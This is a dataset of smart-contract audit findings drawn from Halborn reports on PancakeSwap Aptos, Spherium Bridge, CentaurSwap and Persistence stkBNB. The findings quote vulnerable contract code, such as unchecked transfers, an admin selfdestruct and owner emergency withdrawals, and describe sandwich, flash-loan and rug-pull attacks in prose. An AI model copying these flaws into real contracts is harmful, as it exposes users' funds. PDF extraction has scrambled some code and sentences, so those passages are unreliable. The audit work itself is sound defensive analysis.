        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some functions in the multisig_wallet module are declared in the code, but not used appropriately. This is not a security issue itself, but a good practice recommendation to improve code hygiene. Code Location: next_seq_number function is declared in the code, but never used by any other function, except during tests. Listing 15: pancake-multisig-wallet/sources/multisig_wallet.move 201 public fun next_seq_number ( multisig_wallet_addr : address ): u64  acquires MultisigWallet { 202 let multisig_wallet = borrow_global < MultisigWallet >(  multisig_wallet_addr ); Table :: length (& multisig_wallet . seq_number_to_params_type_name ) 203 204 } is_withdraw_multisig_txs_registered function is declared in the code, but not used in the assert of the init_withdraw function: Listing 16: pancake-multisig-wallet/sources/multisig_wallet.move 273 public fun is_withdraw_multisig_txs_registered < CoinType >( addr :  address ): bool { exists < MultisigTxs < WithdrawParams < CoinType > > >( addr ) 274 275 } Listing 17: pancake-multisig-wallet/sources/multisig_wallet.move (Line 284) 283 public fun init_withdraw < CoinType >( sender : & signer ,  multisig_wallet_addr : address , eta : u64 , expiration : u64 , amount : 34  u64 ) acquires MultisigWallet , MultisigTxs , MultisigWalletEvents { 284 assert !( exists < MultisigTxs < WithdrawParams < CoinType > > >(  multisig_wallet_addr ) , ERROR_MULTISIG_TXS_NOT_EXIST ); let sender_addr = signer :: address_of ( sender ); 285 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to include the #[test] annotation in next_seq_number function and use is_withdraw_multisig_txs_registered in the assert of the init_withdraw function. Remediation plan: ACKNOWLEDGED: The PancakeSwap team acknowledged this finding. 35 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Informational"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contract Bridge.sol, there is an instances where external methods are being called and return value(bool) is being ignored. It was observed that Bridge.executeProposal(Bridge.Proposal) ignores re- turn value by IERC20(proposal.tokenAddress).transfer(proposal.depositor,proposal. amount). Code Location: Listing 2: Bridge.sol (Lines 395,396,397,398) 388 389 390 391 392 393 394 395 396 397 398 399 400 function executeProposal ( Proposal storage proposal ) private whenNotPaused { if ( _burnList [ proposal . tokenAddress ]) { IERC20 ( proposal . tokenAddress ). mint ( proposal . depositor , proposal . amount ); } else { IERC20 ( proposal . tokenAddress ). transfer ( proposal . depositor , proposal . amount ); } } Risk Level: Likelihood - 3 Impact - 2 12 Recommendations: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: SOLVED: Spherium.Finance Team updated the code and added the return value. Listing 3: Bridge.sol (Lines 393,394,395,396,397) 392 393 394 395 396 397 398 } else { bool result = IERC20 ( proposal . tokenAddress ). transfer ( proposal . depositor , proposal . amount ); require ( result , \" unsuccessful transfer \" ); } 13 ",
        "labels": [
            "Halborn",
            "Spherium_Bridge",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Bridge Smart contract uses the floating pragma 0.8.0. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 4: (Lines 1) 1 pragma solidity ^0.8.0; 2 } Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: Spherium.Finance Team locked the pragma version. 14 ",
        "labels": [
            "Halborn",
            "Spherium_Bridge",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Bridge contract uses one of the latest pragma version (0.8.0) which was released on December 16, 2020. The latest pragma version (0.8.7) was released in August 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases In the Solitidy Github repository, there is a json file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_- by_version.json Code Location: Listing 5: (Lines 1) 1 pragma solidity ^0.8.0; 2 } Risk Level: Likelihood - 1 Impact - 2 15 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. Remediation Plan: SOLVED: Spherium.Finance Team updated the code currently uses pragma version 0.7.6. 16 ",
        "labels": [
            "Halborn",
            "Spherium_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Mark below functions as external instead of public: Bridge.sol: getDepositCount, addWhitelistToken, deposit, withdraw, withdrawBridgeFee Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practices, you should use external if you expect that the function will only ever be called externally and use public if you need to call the function internally. Mainly, Marking both function as external can save gas. 17 Remediation Plan: SOLVED: Spherium.Finance Team updated the code and declared external functions instead of public. 18 ",
        "labels": [
            "Halborn",
            "Spherium_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During the test, It has been observed that some of the contract codes not used. There are a few instances of unused code (dead code) in the Bridge.sol. Code Location: Listing 6: (Lines 25) 25 uint8 chainID ; Listing 7: (Lines 334) 334 function withdraw () public {} Risk Level: Likelihood - 1 Impact - 1 Recommendations: Unused codes should be deleted. Remediation Plan: SOLVED: Spherium.Finance Team removed the unused code in the contract. 19 ",
        "labels": [
            "Halborn",
            "Spherium_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "DERIVED RISKS FROM FLASH LOANS ASSESSMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "All the latest attacks started with a Flash loan, and have lately become typical in arbitrage. Flash loans allow an attacker to borrow some funds without any collateral, and the loan is finished and returned in a single transaction. They are executed atomically and without risk. No one is able to intercept a flash loan while it is being performed, then it is used for attackers to quickly get liquidity to fund a financial based attack. For instance, in one of the latest attacks (PancakeBunny) the attacker took 8 different flash loans. Then, the attacker used the liquidity to perform several actions, one of them was used to influence the valuation of the pool (WBNB+BUSDT) swapping 2.32M WBNB for 3.83M BUSDT. PancakeBunny Incident Code Location: Centaur Swap uses a settlement system that prevents the tokens from being swapped on the same transaction. This system would cause any flash loan to revert to its initial state if pending settlements are detected on either of the swapped pools as seen in Listing 1. Listing 1: CentaurPool.sol 1 function swapFrom ( address _sender ) external lock onlyRouter tradeAllowed returns ( uint amount , uint value ) { uint balance = IERC20 ( baseToken ). balanceOf ( address ( this )) ; require ( balance > baseTokenBalance , ' CentaurSwap : INSUFFICIENT_SWAP_AMOUNT '); // Check if has pendingSettlement 2 3 4 5 6 16 S R O T C A F K S I R D E S A B L O C O T O R P 7 8 address settlement = ICentaurFactory ( factory ). settlement () ; require (! ICentaurSettlement ( settlement ). hasPendingSettlement ( _sender , address ( this )) , ' CentaurSwap : PENDING_SETTLEMENT ') ; amount = balance . sub ( baseTokenBalance ); value = getValueFromAmountIn ( amount ); baseTokenBalance = balance ; emit AmountIn ( _sender , amount ); return ( amount , value ); 9 10 11 12 13 14 15 16 17 18 } Result: The assessment is considered successful since flash loans are being prevented by the usage of the settlement system which prevents the swap from fully taking place with the same transaction. 17 S R O T C A F K S I R D E S A B L O C O T O R P ",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "FRONT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "The main issues that make a system vulnerable to front-running attacks are: a lack of transaction confidentiality, and the miners opportunity to arbitrarily execute transactions that can happen as a consequence of an asynchronous system. To prevent the front-running attack, a reliable method must address these two issues, or the entire structure must be changed to prevent race conditions. S R O T C A F K S I R D E S A B L O C O T O R P 18 Sandwich Attack Example: A sandwich attacks profit is the difference between the tokens spent in the initial buy activity and received in the final sell. The attacker has no control over the initial reserves or the victims trade amount; the only variable under his control is the initial amount to trade in the front-run. 1. The first user initiated a normal transaction to get a token swapped. The normal user sets gas price to 10 Gwei. 2. The attacker initiate buy transaction with more gas (20 Gwei). The attacker transaction gains priority under the gas competition mechanism. 3. The Attacker launched another sell transaction at the same moment, this time setting Gas Price to 10 Gwei, which was completed immediately after the normal users trade due to the chronological nonce order. 4. Two attack transactions are mixed with one normal transaction, therefore it is named as an sandwich attack. Result: Centaur Swap uses a settlement system that prevents the tokens from being swapped on the same transaction. This system would cause any front run attack to be delayed until the settlement is completed. This would prevent sandwich attacks from taking place with the same transaction. 19 S R O T C A F K S I R D E S A B L O C O T O R P ",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "LIQUIDITY LOSS EXPOSURE RISK ASSESSMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "Uniswap is a protocol that allows buyers and sellers to swap ERC20 tokens without an exchange or order book. It uses an algorithmic equation that determines the swap rate automatically based on the balances of both tokens, as well as the actual demand for this swapping pair. For instance, the term known as rug pull in De-Fi slang, is a malicious maneuver in the cryptocurrency industry where crypto developers abandon a project and run away with investors funds. Since anyone can spin up a token and smart contract on Ethereum and list it on Uniswap, some developers have come up with unintended liquidity extraction operations. The con begins with minting new tokens, creating Telegram groups to get the buzz going, followed by a Uniswap listing and liquidity injection. At this point, the original malicious liquidity provider would wait for people to swap their ETH for the newly minted coin, after which the tokens creators would drain the liquidity pool, leaving holders with nothing but a worthless coin. Example of a Liquidity Loss event: 1. Someone creates a Token Named \" XYZ \" with total supply of 1 Million and deploys it on the Ethereum network. 2. The rug-puller opens Uniswap and creates a liquidity pool for XYZ / ETH. with 1 million XYZ and 100 ETH. ( 1 ETH = 10,000 XYZ ) 3. Then the rug-puller doe the professional marketing for the Token XYZ on different platforms that anyone can buy XYZ from Uniswap. 4. External users buy XYZ from Uniswap Exchange giving ETH or any other ERC-20 token like UNI in Liquidity pool of XYZ / ETH. ( Uniswap 20 S R O T C A F K S I R D E S A B L O C O T O R P converts any Token into ETH automatically). 5. 10 external users buy 30 ETH worth of XYZ from Uniswap and no one from them adds XYZ token and ETH to XYZ/ETH pool on uniswap that you created. So it means that the rug-puller has 130 ETH now and 700000 XYZ. ( XYZ Token isnt listed anywhere else so its value is Zero ). 6. The rug-puller pulls the trigger and removes the 130 ETH and 700000 XYZ Tokens from Uniswap. The website closes, marketing closes and social networks are removed. This situation is often enabled because a single owner of a contract, or a liquidity address has access to remove all the TVL (Total Value Locked) through a withdraw or transfer function. While sometimes, the developer or owner does not intend to do this malicious act, the risk still exists if the private key is stolen since there is nothing preventing the key-holder from calling the withdraw. Code Location: Furthermore, during code audit some functions were found and considered of critical risk for the liquidity loss exposure assessment. Those functions allows the owners of the system to perform emergency withdraw from any pool with any amount specified. The functions can be seen on Listing 2 and Listing 3. Listing 2: CentaurFactory.sol 136 function emergencyWithdrawFromPool ( address _pool , address _token , uint _amount , address _to ) external onlyOwner override { ICentaurPool ( _pool ). emergencyWithdraw ( _token , _amount , _to ); 137 138 } Listing 3: CentaurPool.sol 303 function emergencyWithdraw ( address _token , uint _amount , address _to ) external onlyFactory { _safeTransfer ( _token , _to , _amount ); emit EmergencyWithdraw ( block . timestamp , _token , _amount , _to ); 304 305 306 21 S R O T C A F K S I R D E S A B L O C O T O R P 307 } Result: The assessment is considered unsuccessful since the functions present on the CentaurFactory and CentaurPool which allows the owner of the pool to perform emergencyWithdraw are considered of high risk and the community should be aware of the existence. It is recommended to completely remove this functionality. Furthermore it is recommended to change the ownership management to a RBAC (Role Based Access Control) system. The Centaur swap pool does only use the onlyOwner modifier to perform critical actions such as enabling/disabling funds withdrawal on specific pools, enabling transfers and so on. However, this functionality should be split between multiple role based users with multi-signature wallets for each one. For example, for the pausing/unpausing functionality of the entire pools, a Pauser role should be created for example and use its modifier onlyPauser. For the emergencyWithdraw functionality a new role named Emergency should be created independent from the owner and use modifiers such as Emergency isPaused onlyEmergencyOwner and only have this funtionality to take place only once the contract has been paused using the Pauser role. The owner should be limited to the minimum operations possible that allows pool management. For the liquidity loss exposure protection itself, Centaur Swap uses oracle prices from Chainlink sources and liquidity checks to prevent this type of attacks. However, issues could arise on the data feed causing price manipulation or invalid calculations as explained in the Price feed - Oracle Risk Assessment. In order to facilitate the trustworthy of the pool it is recommended to use a service that allows Proof of Liquidity. Proof of Liquidity makes it impossible for scammers to take out their liquidity as they are vested for a period of time to enhance development and innovation on the platform. This is ensured by locking the liquidity This means that of tokens that are pre-launched on their platform. 22 S R O T C A F K S I R D E S A B L O C O T O R P project owners cannot pull the liquidity from their project in a way that cons investors out of their money, or tokens. As such issues become prevalent across the DeFi system, projects such as Unicrypt, LID Protocol, and Vesta Protocol aim at solving these liquidity problems on Uniswap and similar DEXs in the future. As it explained before, a rug pull scam mainly arises some minutes, days, or a couple of weeks following the liquidity injection from the hacker. Such a huge sell-off of tokens leads to cascading collapse of projects, whereby the small action of withdrawing liquidity for a profit leads to an eventual collapse of the system. The most common means that reputable teams use to lock their pooled liquidity and gain additional user confidence and trust are through Its also very easy to verify Unicrypt (https://unicrypt.network/). whether or not liquidity for a particular pair is locked and the date that it is locked to. Another recommendation is to integrate OpenZepplin Defender platform. With defender, Sentinels are used to automatically monitor and respond to events, functions, and transaction parameters on your smart contracts. With full Autotask integration, you can add circuit breakers or automated actions so your team can respond to attacks within seconds and receive notifications via email, Slack, Telegram, or Discord. If possible, add to operational processes to research what the coin funds are used for, who the team behind the coins are and the history of trades with this coin. Remediation Plan: PARTIALLY SOLVED: Centaur Swap team implemented a Timelock Contract and multi-signature wallets for: Admin, Normal and Emergency roles. 23 S R O T C A F K S I R D E S A B L O C O T O R P BLOCKCHAIN TRANSACTION BASED RISK FACTORS 24 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Critical"
        ]
    },
    {
        "title": "GOVERNANCE RISK ASSESSMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "In smart contracts which are already running on the blockchain, the upgrading of them is done by a method known as Governance. Governance can be centralized and distributed. Distributed governance allows voters (the ones with the most tokens) to decide actions on smart contracts. If an attacker is able to hijack the governance contract, malicious Thus, controversial governance actions provokes a critical risk. governance proposals can be approved using flash loans. Using flash loans for controlling the Governance In a distributed Governance, the community should be vigilant. For instance, they can burn all tokens involved in any attack performed by flash loans. Governance Hijacking 25 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B Code Location: WheyFarm.sol S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B Centaur Swap uses a centralized governance to create pools, update the states of the liquidity pools and manage Whey tokens. Result: The assessment is considered as passed since governance is centralized. Consider keeping the private key safe or using a multi-signature wallet is enough to prevent the contract from being maliciously updated. Attackers cannot manipulate governance by flash loans. 26 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "TOKEN INFLATION RISK ASSESSMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "Liquidity providers are responsible for ensuring that liquidity pools are well funded. Ideally, liquidity pools are well funded but there may be under founded liquidity pools (when there is a lack of liquidity by both pairs) and zombie pools. In zombie pools, there is many tokens from one of the pairs with respect to the other token of the pair. This can cause token inflation and flash loans cause this to happen. Swapping a huge amount for a token to another can inflate the price of one of the tokens in a pair. Some recent attacks used flash loans to swap from a token to another and unbalanced the token pairs. Furthermore, not taking into account the possibility of inflationary or deflationary tokens can cause the total amount of the pool to be misinterpreted. Code Location: Centaur Swap framework has mechanisms to avoid the token inflation First, the owner of CentaurFactory.sol contract is able to price. lock depositing, withdrawals and trading at the same time and each one separately. Listing 4: CentaurFactory.sol 101 // Pool Functions 102 function setPoolTradeEnabled ( address _pool , bool _tradeEnabled ) public onlyOwner override { ICentaurPool ( _pool ). setTradeEnabled ( _tradeEnabled ); 103 104 } 105 27 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B 106 function setPoolDepositEnabled ( address _pool , bool _depositEnabled ) public onlyOwner override { ICentaurPool ( _pool ). setDepositEnabled ( _depositEnabled ); 107 108 } 109 110 function setPoolWithdrawEnabled ( address _pool , bool _withdrawEnabled ) public onlyOwner override { ICentaurPool ( _pool ). setWithdrawEnabled ( _withdrawEnabled ); 111 112 } In addition, the use of an internal token such as CentaurLPToken. CentaurLPToken.sol manages by minting or burning internal tokens that the pool does not become unbalanced. Listing 5: CentaurLPToken.sol 20 function _mint ( address to , uint value ) internal { totalSupply = totalSupply . add ( value ); 21 balanceOf [ to ] = balanceOf [ to ]. add ( value ); 22 emit Transfer ( address (0) , to , value ); 23 24 } 25 26 function _burn ( address from , uint value ) internal { 27 28 29 30 } balanceOf [ from ] = balanceOf [ from ]. sub ( value ); totalSupply = totalSupply . sub ( value ); emit Transfer ( from , address (0) , value ); Furthermore, no issues were found during the manipulation of deflationary or inflationary tokens. As seen on Listing 6 the amount used for the liquidity calculation is taken from the subtraction of the previous baseTokenBalance and the current pool balance of that token. The minted tokens will be taken from that subtraction. With this approach the minted tokens will always take into account the difference between the previous balance and the current one. However, if manual transactions are performed before any liquidity is added those will be accredited to the first one calling the addLiquidity function. 28 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B Listing 6: CentaurPool.sol (Lines 101,110) 99 function mint ( address to ) external lock onlyRouter depositAllowed returns ( uint liquidity ) { uint balance = IERC20 ( baseToken ). balanceOf ( address ( this )) ; uint amount = balance . sub ( baseTokenBalance ); if ( totalSupply == 0) { liquidity = amount . add ( baseTokenTargetAmount ); } else { liquidity = amount . mul ( totalSupply ). div ( baseTokenTargetAmount ); } require ( liquidity > 0, ' CentaurSwap : INSUFFICIENT_LIQUIDITY_MINTED '); _mint (to , liquidity ); baseTokenBalance = baseTokenBalance . add ( amount ); baseTokenTargetAmount = baseTokenTargetAmount . add ( amount ); emit Mint ( msg . sender , amount ); 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 } Result: The assessment is considered successful since the pool balance methodology proposed by Centaur Swap team is adequate and prevents manipulating the price of a token and unbalancing a pool. 29 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B BLOCKCHAIN SOURCE BASED RISK FACTORS 30 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "TIMELOCK RISK ASSESSMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "Timelock is a fixed delay time that allows for some reaction time in the event of an unexpected change that is not agreed upon or malicious, and therefore it is possible to unlock the funds and secure them. Example Codes Without Timelock - Owner Action: WheyFarm.sol 31 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B Listing 7 1 MakerDAO - 4 hours Timelock 2 Uniswap - 48 hours Timelock 3 SushiSwap - 48 hours Timelock Uniswap Timelock SushiSwap Timelock Result: The assessment is considered successful since Centaur Swap does have three minutes settlement set on their smart contracts. The timelock is set by code, once set no one can reduce the waiting time if not allowed using a governance system, which in this case it is centralized using the onlyOnwer modifier. 32 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B NON-BLOCKCHAIN SOURCE BASED RISK FACTORS 33 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRICE FEED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf",
        "body": "An oracle is a technological methodology that converts external data sources into a format that can be used in a blockchain. This allows smart contracts to define state changes and trigger events on a blockchain based on outside external events and interact with the outside world. The problem with oracles is that they create centralized points of trust Since into systems that are meant to be trustless and decentralized. an oracle controls the input data into a smart contract, it therefore controls the operation of the smart contract as it responds to the input As an example, If one of oracle feeds incorrect pricing data, data. arbitrage trading bots will quickly complete huge volume transactions. Code Location: CentaurPool.sol Result: Due to oracles are a central point of failure, data sources can go offline and price calculation can cause low liquidity pairs and incorrect values. With the increasing number of oracles, the system design can get complicated and a centralized structure can be constructed. On the other hand, the increase in the number of oracles may cause the system As an example solution, The to be open to different attack vectors. 34 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B - N O N price feed should be obtained from the small group of privileged users. Therefore, an attacker could not directly change price feed via the integration. But, this solution methodology also has disadvantages. The protocol would not able to update the price in the times of protocol. Uniswap introduced new methodology named as Time-Weighted Average Price Oracle on the V2. (https://uniswap.org/docs/v2/core-concepts/oracles/) Time-Weighted Average Price Oracle oracle provides strong protection method to oracle manipulation attacks. However, there are problems in providing a quick feed on this method as well. Although, Chainlink is used as an external oracle in the CentaurSwap contracts, implementing your own oracle will minimize attack surfaces. 35 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B - N O N THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "CentaurSwap_Financial_Pentesting_Halborn_v1_1",
            "Severity: Medium"
        ]
    },
    {
        "title": "USAGE OF SELF",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The usage of the selfdestruct function erases the contract code from the blockchain. Although it is understandable under certain circumstances, this function if executed inappropriately can lead to the destruction of the token contract making users loose all the deposited money and making the decentralized application broken. Code Location: Listing 1: StakeBNBToken.sol 125 function selfDestruct ( address addr ) external onlyRole (  DEFAULT_ADMIN_ROLE ) whenPaused { selfdestruct ( payable ( addr )) ; } 126 127 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Do not implement the self-destruct without checking users funds has been given back. Remediation Plan: The us- SOLVED: ing ID d059bccbb368158a63767107b37894d47009c385. As a result, this gives time persistenceOne team from fixed openzeppelin timelockcontract by commit above on issue the the the 13 to the users to call the withdraw function in case the self-destruct function is triggered. Moreover, the persistenceOne team ensures that this function will only be called in case a major upgrade occurs on the Binance ecosystem and gets the compromise to re-balance the stkBNB tokens to every user account if this situation happens. 14 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Medium"
        ]
    },
    {
        "title": "IMPROPER CHECK ON CLAIM FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The **_claim** function checks the amount to withdraw from the protocol is less than the current contract balance. However, this check is not correct, and it can lead to revert the transaction as the claimReserve can be 0, although the contract balance is not 0. So on the subtraction on L786, the contract reverts with an unhandled arithmetic exception. Code Location: Listing 2: StakePool.sol 781 if ( address ( this ). balance < req . weiToReturn ) { 782 783 } revert InsufficientFundsToSatisfyClaim () ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: Check that the amount to be returned is less than the claimReserve. Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 15 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Low"
        ]
    },
    {
        "title": "UNSAFE CASTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The StakePool contracts performs unsafe casting from uint256 to int256 that can lead to overflow. Although the risk is minimum as the amount of BNB is still far from reaching those numbers. Code Location: Listing 3: StakePool.sol 560 if ( _bnbToUnbond > int256 ( excessBNB )) { Listing 4: StakePool.sol 569 _bnbToUnbond -= int256 ( shortCircuitAmount ); Listing 5: StakePool.sol 621 _bnbToUnbond -= int256 ( bnbUnbonding_ ); Listing 6: StakePool.sol 744 _bnbToUnbond += int256 ( weiToReturn ); Risk Level: Likelihood - 1 Impact - 3 Recommendation: To safely avoid the unlikely situation, it is recommended to use the SafeCast library from OpenZeppelin. 16 Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. The final implementation con- tains the recommended library to avoid overflows on arithmetic operations when casting. 17 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Low"
        ]
    },
    {
        "title": "FEE VAULT SHOULD NOT BE ABLE TO SEND TOKENS TO STAKEPOOL CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The claimStkBNB function from the FeeVault contract can send the fees Although this action is restricted by the to the StakePool contract. onlyOwner modifier, this action may lead the fees to be locked on the StakePool contract forever. This happens because there is no way to call the claim function from the FeeVault contract. Code Location: Listing 7: FeeVault.sol IStakedBNBToken ( addressStore . getStkBNB () ). send ( recipient , 75 function claimStkBNB ( address recipient , uint256 amount ) external  override onlyOwner { 76  amount , \" \"); 77 78 79 emit Withdraw ( msg . sender , recipient , amount ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Ensure that the recipient address is not the stakepool contract to avoid a possible situation where funds maybe locked in the contract. 18 Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 19 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Low"
        ]
    },
    {
        "title": "USE CALL INSTEAD OF SEND OR TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The usage of send or transfer limits the amount of gas send in the trans- action to 2300. This can be considered a safeguard to avoid reentrancy. However, given the current protections of the contracts, it does seem feasible to use call function without further risk. This implies that the system expects to be used by some contracts that can execute more complex code on the fallback function. Code Location: Listing 8: StakePool.sol (Line 793) 770 771 772 773 774 775 776 777 778 779 780 781 782 783 784 785 786 787 788 function _claim ( uint256 index ) internal returns ( bool ) { if ( index >= claimReqs [ msg . sender ]. length ) { revert IndexOutOfBounds ( index ); } // find the requested claim ClaimRequest memory req = claimReqs [ msg . sender ][ index ]; if (! _canBeClaimed ( req )) { return false ; } if ( _claimReserve < req . weiToReturn ) { revert InsufficientFundsToSatisfyClaim () ; } // update _claimReserve _claimReserve -= req . weiToReturn ; // delete the req , as it has been fulfilled ( swap deletion  for O (1) compute ) 789 claimReqs [ msg . sender ][ index ] = claimReqs [ msg . sender ][  claimReqs [ msg . sender ]. length - 1]; 790 791 claimReqs [ msg . sender ]. pop () ; 20 792 793 794 795 796 } // return BNB back to user payable ( msg . sender ). transfer ( req . weiToReturn ); emit Claim ( msg . sender , req , block . timestamp ); return true ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: If the Persistence team consider it appropriate, change the transfer function to call function to allow contracts to execute code in the fallback function. Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 21 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING TWO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
